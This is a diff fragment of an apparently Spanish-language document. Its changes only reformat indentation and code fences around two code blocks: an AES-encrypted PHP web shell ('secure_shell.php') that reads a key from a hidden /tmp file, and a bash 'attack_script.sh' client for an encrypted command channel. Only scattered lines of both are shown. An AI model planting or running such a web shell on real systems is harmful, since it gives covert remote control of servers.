@@ -749,7 +749,7 @@ resultado:
 
     Implementación del Web Shell Cifrado (secure_shell.php)
 
-    ```text
+     ```text
              <?php
                 // secure_shell.php - Web shell con cifrado AES-256-CBC
                 $SECRET_KEY = file_get_contents('/tmp/.cache/aes_key.bin');
@@ -819,11 +819,12 @@ resultado:
                     echo "Parámetro enc_cmd requerido";
                 }
                 ?>
-    ```
+     ```
 
     
-          - Ejecución de Comandos Cifrados:
-            ```text
+    - Ejecución de Comandos Cifrados:
+    
+      ```text
                         #!/bin/bash
                         # attack_script.sh - Cliente para canal cifrado
                         
@@ -847,7 +848,7 @@ resultado:
                                 -K $(echo -n "$SECRET_KEY" | base64 -d | xxd -p -c 256) \
                                 -iv "$IV" 2>/dev/null
                         }
-           ```
+      ```
                         
 
            - Ejemplos de uso
